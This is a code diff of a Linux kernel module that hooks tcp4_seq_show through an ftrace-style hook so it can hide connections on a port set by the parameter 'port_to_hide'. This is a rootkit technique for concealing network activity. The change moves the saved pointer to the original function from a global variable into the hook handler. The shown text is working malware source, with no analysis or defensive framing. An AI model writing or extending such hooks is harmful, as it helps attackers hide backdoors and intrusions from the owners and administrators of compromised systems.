@@ -17,10 +17,11 @@ static int port_to_hide = -1;
 module_param(port_to_hide, int, 0600);
 
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
-static original_tcp4_seq_show_t original_tcp4_seq_ptr;
 static struct fthook hook;
 
 int new_tcp4_seq_show(struct seq_file *seq, void *v) {
+    original_tcp4_seq_show_t original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_ptr;
+
     if (v == SEQ_START_TOKEN) {
         return original_tcp4_seq_ptr(seq, v);    
     }
@@ -55,7 +56,6 @@ int load(void) {
         return -1;
     }
 
-    original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_ptr;
     pr_info("Initialized successfuly!");
 
     return 0;
